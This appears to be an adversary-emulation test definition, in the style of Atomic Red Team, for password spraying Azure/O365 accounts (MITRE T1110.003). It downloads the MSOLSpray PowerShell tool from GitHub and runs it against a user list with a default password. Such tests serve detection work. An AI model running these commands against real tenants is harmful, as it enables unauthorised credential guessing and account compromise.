api_version: "2.0"
name: Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)
description: |
    This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.
args:
    - name: user_list
      type: string
      default: $env:temp\T1110.003UserList.txt
    - name: password
      type: string
      default: P@ssword1
uuid: f3a10056-0160-4785-8744-d9bd7c12dc39
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.003: Password Spraying'
requirements:
    platforms:
        - os: azure-ad
steps:
    - name: |
        MSOLSpray module must exist in PathToAtomicsFolder\..\ExternalPayloads.
      inline: |
        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"
        }}
      executor: powershell
    - name: password-spray-microsoft-online-accounts-with-msolspray-(azure/o365)
      inline: |
        import-module "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"
        Invoke-MSOLSpray -UserList "{{.Args.user_list}}" -Password "{{.Args.password}}"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
